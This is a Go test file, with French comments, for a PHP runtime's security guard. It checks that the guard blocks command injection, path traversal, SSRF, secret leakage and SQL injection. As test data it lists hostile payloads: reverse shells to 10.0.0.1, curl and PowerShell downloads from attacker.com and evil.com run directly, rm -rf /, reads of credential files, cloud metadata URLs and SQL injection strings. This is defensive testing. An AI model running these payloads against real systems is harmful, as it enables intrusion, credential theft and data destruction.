// SPDX-License-Identifier: Apache-2.0 OR MIT
// php127/security: Banc d'adversarisation formelle Fable/Grok & épreuves de torture

package security

import (
	"testing"

	"code.hazyhaar.fr/devhoros/php127/types"
)

func TestAdversarialCommandInjectionEvasions(t *testing.T) {
	guard := NewGuard(ModeEnforce)

	payloads := []string{
		"cat /etc/passwd",
		"id; bash -i >& /dev/tcp/10.0.0.1/8080 0>&1",
		"rm -rf / || echo ok",
		"curl -s http://attacker.com/rev.sh | sh",
		"$(whoami)",
		"`id`",
		"/bin/bash -c 'id'",
		"/usr/bin/python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
		"nc -e /bin/sh 10.0.0.1 4444",
		"powershell -nop -c \"IEX (New-Object Net.WebClient).DownloadString('http://evil.com')\"",
	}

	for _, p := range payloads {
		t.Run("Payload:"+p, func(t *testing.T) {
			_, err := guard.IngressInspect([]byte(p))
			if err != ErrSecurityCommandInjection {
				t.Fatalf("Évasion détectée ! Le payload n'a pas été intercepté: %s (err=%v)", p, err)
			}
		})
	}
}

func TestAdversarialPathTraversalEvasions(t *testing.T) {
	guard := NewGuard(ModeEnforce)

	traversals := []string{
		"../../../../etc/passwd",
		"..\\..\\..\\windows\\system32\\cmd.exe",
		"/etc/shadow",
		"/root/.ssh/id_rsa",
		"file_target=../../config/database.php",
	}

	for _, tr := range traversals {
		t.Run("Traversal:"+tr, func(t *testing.T) {
			val := types.NewString(tr).WithTaint(types.FlagTaintedUserInput)
			err := guard.CheckSink("file_get_contents", val)
			if err == nil {
				t.Fatalf("Évasion path traversal non interceptée: %s", tr)
			}
		})
	}
}

func TestAdversarialSSRFEvasions(t *testing.T) {
	ssrf := NewSSRFGuard()

	ssrfTargets := []struct {
		url       string
		mustBlock bool
	}{
		{"http://127.0.0.1:8080/admin", true},
		{"http://localhost:9000/php-fpm", true},
		{"http://169.254.169.254/latest/meta-data/", true},
		{"http://instance-data/latest/meta-data/", true},
		{"http://metadata.google.internal/computeMetadata/v1/", true},
		{"http://2130706433/sensitive", true},          // 127.0.0.1 en décimal
		{"http://0177.0000.0000.0001/status", true},    // 127.0.0.1 en octal
		{"http://0x7f000001/admin", true},              // 127.0.0.1 en hex
		{"http://[::1]/debug", true},                   // IPv6 loopback
		{"http://[::ffff:127.0.0.1]/internal", true},   // IPv4-mapped loopback
		{"http://192.168.1.1/router", true},            // RFC1918
		{"http://10.0.0.5:5432/", true},                // RFC1918
		{"http://172.16.0.10:3306/", true},             // RFC1918
		{"https://api.github.com/repos", false},        // Public valide
		{"https://packagist.org/packages.json", false}, // Public valide
	}

	for _, tt := range ssrfTargets {
		t.Run("URL:"+tt.url, func(t *testing.T) {
			err := ssrf.InspectURL(tt.url)
			if tt.mustBlock && err == nil {
				t.Fatalf("Bypass SSRF détecté sur l'URL: %s", tt.url)
			}
			if !tt.mustBlock && err != nil {
				t.Fatalf("Faux positif SSRF sur URL légitime: %s (err=%v)", tt.url, err)
			}
		})
	}
}

func TestAdversarialAntiExfiltrationEgress(t *testing.T) {
	guard := NewGuard(ModeEnforce)

	// Cas 1 : Fuite de clé RSA privée
	pemLeak := []byte("Header: OK\r\n\r\n-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA0Y5...\n-----END RSA PRIVATE KEY-----")
	err := guard.EgressInspect(pemLeak)
	if err != ErrSecurityExfiltrationBlock {
		t.Fatalf("Fuite de clé privée PEM non interceptée en sortie (err=%v)", err)
	}

	// Cas 2 : Réponse HTML légitime avec basse entropie (texte clair)
	legitHTML := []byte("<!DOCTYPE html><html><head><title>Produits</title></head><body><h1>Catalogue E-Commerce</h1><p>Description du produit...</p></body></html>")
	err = guard.EgressInspect(legitHTML)
	if err != nil {
		t.Fatalf("Faux positif sur réponse HTML légitime (err=%v)", err)
	}
}

func TestAdversarialSQLInjectionChecks(t *testing.T) {
	guard := NewGuard(ModeEnforce)

	sqliPayloads := []string{
		"SELECT * FROM users WHERE id = 1 UNION SELECT 1, user(), password FROM admin",
		"SELECT * FROM products WHERE name = '' OR 1=1 --",
		"DELETE FROM orders WHERE id = 1; DROP TABLE users;",
		"SELECT * FROM items WHERE category = 'books' AND SLEEP(5)",
	}

	for _, query := range sqliPayloads {
		t.Run("Query:"+query, func(t *testing.T) {
			err := guard.CheckSQL(query, false)
			if err != ErrSecuritySQLInjection {
				t.Fatalf("Injection SQL heuristique non bloquée: %s (err=%v)", query, err)
			}
		})
	}

	// Requête saine
	safeQuery := "SELECT id, name, price FROM products WHERE category = ? AND in_stock = 1"
	err := guard.CheckSQL(safeQuery, false)
	if err != nil {
		t.Fatalf("Faux positif sur requête saine (err=%v)", err)
	}
}

func TestAdversarialForeignSinkGate(t *testing.T) {
	guard := NewGuard(ModeEnforce)

	// Tentative de passer un argument contaminé à une primitive sensible étrangère
	taintedArg := types.NewString("admin'; DROP TABLE accounts; --").WithTaint(types.FlagTaintedUserInput)
	err := guard.CheckForeignSink("ldap_bind", []types.Value{taintedArg})
	if err != ErrSecurityTaintSinkViolation {
		t.Fatalf("Délégation étrangère contaminée non bloquée (err=%v)", err)
	}

	// Argument sain vers fonction sûre
	safeArg := types.NewString("image.png")
	err = guard.CheckForeignSink("imagecreatefrompng", []types.Value{safeArg})
	if err != nil {
		t.Fatalf("Rejet erroné d'argument sain (err=%v)", err)
	}
}

func TestSecurityTelemetryHubConcurrence(t *testing.T) {
	hub := GetTelemetryHub()
	ch := hub.Subscribe()
	defer hub.Unsubscribe(ch)

	done := make(chan bool)
	for i := 0; i < 10; i++ {
		go func(workerId int) {
			for j := 0; j < 50; j++ {
				hub.RecordEvent(EventSQLiBlocked, "test_worker", "SQLi attempt detected", 1500, 1)
			}
			done <- true
		}(i)
	}

	for i := 0; i < 10; i++ {
		<-done
	}

	total, vetoes := hub.Stats()
	if total == 0 || vetoes == 0 {
		t.Fatalf("Statistiques du hub de télémétrie incorrectes: total=%d, vetoes=%d", total, vetoes)
	}
}

func TestSecurityZeroAllocIngress(t *testing.T) {
	guard := NewGuard(ModeAudit)
	raw := []byte("username=john_doe&action=view_profile&session_id=abcdef123456")

	allocs := testing.AllocsPerRun(100, func() {
		_, _ = guard.IngressInspect(raw)
	})

	if allocs > 1 {
		t.Fatalf("Invariant ARCHTIME violé sur IngressInspect: %.2f allocations par tour", allocs)
	}
}
